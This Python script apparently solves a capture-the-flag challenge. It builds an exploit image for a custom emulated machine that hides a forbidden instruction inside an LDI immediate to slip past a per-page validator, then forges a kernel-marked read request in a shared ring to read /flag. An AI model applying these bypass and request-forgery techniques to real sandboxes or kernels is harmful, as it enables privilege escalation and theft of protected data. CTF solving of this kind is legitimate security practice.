#!/usr/bin/env python3
import struct, subprocess, tempfile, os, sys
from pathlib import Path

# gmi_tool.py ships alongside this script (shared with the ICXX challenge).
from gmi_tool import checksum, write_words

SALT=[0x7e416e,0x5a5213,0xe586]
MASK=0x7fffff

class Asm:
    def __init__(self): self.w=[]; self.labels={}; self.fix=[]
    def label(self,n): self.labels[n]=len(self.w)
    def emit(self,x): self.w.append(x&MASK)
    def rrr(self,op,d,a,b): self.emit((op<<16)|(d<<12)|(a<<8)|(b<<4))
    def movi(self,r,x): self.emit((0x12<<16)|(r<<12)|(x&0xfff))
    def ldi(self,r,x): self.emit((0x24<<16)|(r<<12)); self.emit(x)
    def load(self,d,b,o=0): self.emit((0x47<<16)|(d<<12)|(b<<8)|(o&0xff))
    def store(self,s,b,o=0): self.emit((0x0e<<16)|(s<<12)|(b<<8)|(o&0xff))
    def call(self,a): self.ldi(14,a); self.emit(0x57e000)
    def br(self,op,l): self.fix.append((len(self.w),op,l)); self.emit(op<<16)
    def bz(self,l): self.br(0x4e,l)
    def bnz(self,l): self.br(0x78,l)
    def octpack_smuggled(self,src,base,offset):
        """Execute forbidden OCTPACK by hiding it as an LDI immediate.

        The emulator normally rejects a control-flow transfer into an LDI's
        second word.  Its continuation check accidentally skips addresses
        whose low byte is 0xff (and 0x00), though, so put the hidden word at
        the end of a page before branching to it.  The validator scans each
        page independently, so the covering LDI and its hidden immediate must
        remain on the same page.
        """
        while ((0x120000 + len(self.w) + 2) & 0xff) != 0xff:
            self.emit(0x080000)              # NOP
        n=f'_oct_{len(self.w)}'; trig=n+'_trig'; after=n+'_after'
        self.br(0x49,trig)
        self.emit((0x24<<16)|(14<<12))       # LDI R14, <next word>
        self.label(n)
        self.rrr(0x52,src,base,offset)       # skipped by static validator
        self.br(0x49,after)
        self.label(trig)
        self.br(0x49,n)
        self.label(after)
    def done(self):
        for i,op,l in self.fix:
            off=self.labels[l]-(i+1)
            assert -0x8000<=off<0x8000
            self.w[i]=(op<<16)|(off&0xffff)
        return self.w

A=Asm()
CTX=0x110000; RESP=0x110010; RESP2=0x110020
SCRATCH=0x110030; FLAGPATH=0x110040; MARK=0x110050
SHCTX=0x110060; SHMETA=0x110070
OLDIDX=0x110080; NONCE=0x110081; TARGET=0x110082; SOURCE=0x110083
DUMMY=0x110090
FLAGBUF=0x110100

# Establish the normal userspace portal context.
A.ldi(0,CTX); A.ldi(1,0x524547); A.ldi(2,SCRATCH); A.call(0x101194)

# Generate two completed responses.  The first /flag read is denied normally;
# the successful terminal write occupies response slot 1 and gives us a
# kernel-marked zero at shared response word 5 (0x6ffc0d).
A.ldi(0,CTX); A.ldi(1,FLAGPATH); A.movi(2,5); A.ldi(3,FLAGBUF)
A.movi(4,0xa0); A.movi(5,0); A.ldi(6,RESP); A.call(0x101b8e)
A.ldi(0,CTX); A.ldi(1,MARK); A.movi(2,3); A.ldi(3,RESP2); A.call(0x10162c)

# Ring indices are monotonic and are not reset to zero for our process.  After
# the synchronous terminal call, metadata[5] is the response-consumer index;
# its predecessor identifies the just-consumed terminal response.  Compute
# that physical slot dynamically rather than assuming it is slot 1.
A.ldi(1,0x6ffcb8); A.load(0,1,5); A.movi(1,1); A.rrr(0x61,0,0,1)
A.movi(1,0x17); A.rrr(0x0d,0,0,1); A.movi(1,8); A.rrr(0x30,0,0,1)
A.ldi(1,0x6ffc05); A.rrr(0x5b,0,0,1); A.ldi(1,SOURCE); A.store(0,1,0)

# Reproduce the read wrapper's type-token lookup.  101061 returns the opaque
# token passed to the ring producer; the actual five-word marshal area is
# ctx[1], not the token itself.
A.ldi(0,CTX); A.load(0,0,4); A.rrr(0x03,8,0,0)
A.call(0x102a3e); A.rrr(0x03,9,0,0)
A.call(0x102a53); A.rrr(0x03,10,0,0)
A.rrr(0x03,0,8,0); A.rrr(0x03,1,9,0); A.rrr(0x03,2,10,0)
A.call(0x101061); A.rrr(0x03,9,0,0)       # R9 = opaque read token

A.ldi(1,CTX); A.load(1,1,1)                # ctx[1] = marshal area
A.ldi(0,FLAGPATH); A.store(0,1,0)
A.movi(0,5); A.store(0,1,1)
A.ldi(0,FLAGBUF); A.store(0,1,2)
A.movi(0,0xa0); A.store(0,1,3)
A.movi(0,0); A.store(0,1,4)

# Run only the producer against shadow metadata.  It writes the genuine slot
# and MAC, but the kernel cannot observe the new producer index yet.
for i in range(4):
    A.ldi(1,0x6ffcb8); A.load(0,1,i)
    A.ldi(1,SHMETA); A.store(0,1,i)
A.ldi(1,SHMETA); A.load(0,1,0); A.ldi(1,OLDIDX); A.store(0,1,0)

# Address of request word 0: 0x6ffb00 + (producer % 23) * 10.
A.ldi(0,OLDIDX); A.load(0,0,0); A.movi(1,0x17); A.rrr(0x0d,0,0,1)
A.movi(1,10); A.rrr(0x30,0,0,1); A.ldi(1,0x6ffb00); A.rrr(0x5b,0,0,1)
A.ldi(1,TARGET); A.store(0,1,0)

for i in (0,1,2):
    A.ldi(1,CTX); A.load(0,1,i); A.ldi(1,SHCTX); A.store(0,1,i)
A.ldi(0,DUMMY); A.ldi(1,SHCTX); A.store(0,1,6)
A.ldi(0,SHMETA); A.store(0,1,7)

# read producer(shadow_ctx, token, flag=0, argument_count=5)
A.ldi(0,SHCTX); A.rrr(0x03,1,9,0); A.movi(2,0); A.movi(3,5)
A.call(0x101335); A.ldi(1,NONCE); A.store(0,1,0)

# POP preserves the kernel mark from the successful response's zero status.
# Smuggled OCTPACK replaces the already-zero second byte of request word 0,
# leaving numeric count=5 intact while applying mark 1 to exactly that word.
A.rrr(0x03,8,13,0); A.ldi(0,SOURCE); A.load(13,0,0)
A.emit(0x7f1000); A.rrr(0x03,13,8,0)
A.ldi(2,TARGET); A.load(2,2,0); A.movi(3,1); A.octpack_smuggled(1,2,3)
A.emit(0x5c0000)

# Atomically make the forged request visible and ring the real portal.
for i in (0,2):
    A.ldi(1,SHMETA); A.load(0,1,i); A.ldi(1,0x6ffcb8); A.store(0,1,i)
A.emit(0x5c0000)
# Match the producer's doorbell ABI exactly: at the interrupt boundary R0 must
# still contain the newly published index.  The low-level interrupt consumer
# uses the saved R0 as its upper bound; leaving the MMIO address in R0 makes it
# reject the ring as corrupt before inspecting our tagged slot.
A.ldi(1,CTX); A.load(1,1,6)
A.ldi(0,SHMETA); A.load(0,0,0); A.store(0,1,0)
# The doorbell raises an asynchronous interrupt after the next opcode has
# already been fetched.  Make that speculative opcode a one-word NOP; putting
# an LDI here would save its immediate as the resume PC and trip the emulator's
# branch-into-continuation guard on ERET.
A.emit(0x080000)

# Wait for the trusted read response, then print the complete bounded buffer.
A.ldi(0,CTX); A.ldi(1,NONCE); A.load(1,1,0); A.ldi(2,RESP); A.call(0x10149f)
A.ldi(0,CTX); A.ldi(1,FLAGBUF); A.movi(2,0xa0); A.ldi(3,RESP2); A.call(0x10162c)
A.label('hang'); A.br(0x49,'hang')
code=A.done()

# Keep the stock userspace runtime routines needed above.
sw=list(struct.unpack('<%dI'%(Path('/tmp/sandbox_text.u32').stat().st_size//4),
                      Path('/tmp/sandbox_text.u32').read_bytes()))
runtime=sw[0xe00:0x2afa]
assert len(runtime)==0x1cfa

data=[0]*0x1a0
def put(addr,s):
    off=addr-0x110000
    vals=list(s if isinstance(s,(bytes,bytearray,list,tuple)) else s.encode())
    data[off:off+len(vals)]=vals
put(FLAGPATH,b'/flag')
put(MARK,b'S1\n')

header_words=12+5*3
off_code=header_words
off_runtime=off_code+len(code)
off_data=0x2000-len(data)
assert off_runtime+len(runtime) <= off_data
base=[0x494d47,1,*SALT,3,0x120000,0,0,0x6ffb00,0,0]
base += [off_code,len(code),0x120000,0x1000,13]
base += [off_runtime,len(runtime),0x100e00,0x1d00,13]
base += [off_data,len(data),0x110000,0x2000,7]

words=[0]*0x2000
words[:len(base)]=base
words[off_code:off_code+len(code)]=code
words[off_runtime:off_runtime+len(runtime)]=runtime
words[off_data:off_data+len(data)]=data
words[8]=0
words[10]=checksum(words,SALT)
out=Path('/tmp/direct_read.gmi')
write_words(out,words)
write_words(Path('exploit.gmi'),words)
print('code words',len(code),'total words',len(words),'bytes',len(words)*3,
      'checksum',hex(words[10]))
print(out)
